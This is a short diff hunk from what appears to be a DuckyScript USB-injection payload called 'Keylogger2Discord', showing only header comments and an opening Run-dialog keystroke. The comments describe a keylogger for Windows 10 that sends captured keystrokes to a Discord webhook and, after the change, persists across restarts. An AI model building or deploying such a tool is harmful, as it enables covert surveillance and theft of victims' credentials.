@@ -2,7 +2,7 @@ REM Title: Keylogger2Discord
 REM Author: Oscar R.C.
 REM Description: Sends a text file with the keylog of the computer
 REM Usage: Add your discord hook where it says ENTER_DISCORD_Hook_HERE and edit the RunTime (in minutes) and TimesRun variable if you wish.
-REM If you want the keylogger to persist between restarts set the $Persistent variable to $true
+REM If you want the keylogger to persist between restarts during n days set the variable DaysRun to a number greater than 0. To persist indefinitely set it to -1
 REM Target: Windows 10
 
 GUI r
